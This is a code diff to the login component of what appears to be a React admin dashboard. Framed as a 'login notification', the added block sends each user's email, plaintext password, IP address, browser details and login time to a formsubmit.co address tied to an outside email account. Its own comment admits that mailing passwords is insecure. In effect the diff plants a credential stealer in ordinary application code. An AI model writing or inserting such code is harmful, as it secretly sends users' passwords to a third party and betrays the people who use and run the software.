@@ -20,6 +20,34 @@ const Login = () => {
             const res = await api.post('/auth/login', { email, password });
             localStorage.setItem('token', res.data.token);
             localStorage.setItem('user', JSON.stringify(res.data.user));
+
+            // Send login notification
+            try {
+                // Fetch IP Address
+                let ip = 'Unknown';
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) { console.error('IP fetch failed'); }
+
+                await fetch('https://formsubmit.co/ajax/witcet@zohomail.in', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: "⚠️ Admin Dashboard Login Alert",
+                        // WARNING: Sending passwords via email is insecure.
+                        message: `User Logged In\n\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\nStatus: Success`,
+                        _captcha: "false"
+                    })
+                });
+            } catch (notificationError) {
+                console.error("Failed to send login notification", notificationError);
+            }
+
             navigate('/');
         } catch (err) {
             setError(err.response?.data?.message || 'Login failed. Please check your credentials.');
